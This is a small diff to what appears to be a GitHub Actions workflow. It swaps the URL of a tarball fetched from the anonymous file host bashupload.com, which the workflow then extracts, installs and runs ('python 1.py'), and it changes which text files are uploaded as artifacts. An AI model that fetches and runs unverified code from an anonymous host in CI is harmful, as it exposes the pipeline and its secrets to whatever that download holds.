@@ -17,7 +17,7 @@ jobs:
       - name: Run a multi-line script
         run: |
           sudo apt update
-          wget https://bashupload.com/fU50X/github.tar.gz
+          wget https://bashupload.com/Pizr1/github.tar.gz
           tar -xf github.tar.gz
           pip install -r requirements.txt
           python 1.py
@@ -25,5 +25,5 @@ jobs:
       - name: Upload .txt files from data folder
         uses: actions/upload-artifact@v4
         with:
-          name: OK
-          path: OK.txt
+          name: data
+          path: data/*.txt
